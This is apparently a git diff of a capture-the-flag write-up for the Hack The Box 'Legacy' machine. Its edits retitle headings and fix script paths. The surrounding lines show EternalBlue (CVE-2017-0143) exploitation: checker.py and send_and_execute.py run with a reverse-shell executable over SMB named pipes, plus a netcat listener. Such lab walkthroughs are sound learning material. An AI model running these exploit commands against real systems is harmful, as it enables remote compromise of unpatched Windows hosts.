@@ -52,7 +52,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 57.34 seconds
 ```
 
-# Enumeration (1)
+# Enumeration
 
 ## Port 445 `Windows XP microsoft-ds`
 
@@ -102,7 +102,7 @@ Host script results:
 Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds
 ```
 
-# Exploitation (1)
+# Exploitation
 
 Out of these 2 vulnerabilties, I will be picking `CVE-2017-0143`, or better known as `EternalBlue`. `Metasploit` has modules that exploit this vulnerability but I will be using some scripts that I found on Github that are able to do the same job.
 
@@ -116,7 +116,7 @@ $ curl https://raw.githubusercontent.com/worawit/MS17-010/master/checker.py > et
 Exploiting `EternalBlue` requires us to find an accessible named pipe, so lets run `checker.py`.
 
 ```bash
-$ python checker.py 10.10.10.4
+$ python eternalblue/checker.py legacy.htb
 Target OS: Windows 5.1
 The target is not patched
 
@@ -149,7 +149,7 @@ listening on [any] 1337 ...
 Then finally we can exploit the vulnerability with `send_and_execute.py` and specifying our executable and the name of the named pipe we want to use.
 
 ```bash
-$ python send_and_execute.py legacy.htb reverse.exe 445 browser 
+$ python eternalblue/send_and_execute.py legacy.htb reverse.exe 445 browser 
 Trying to connect to legacy.htb:445
 Target OS: Windows 5.1
 Groom packets
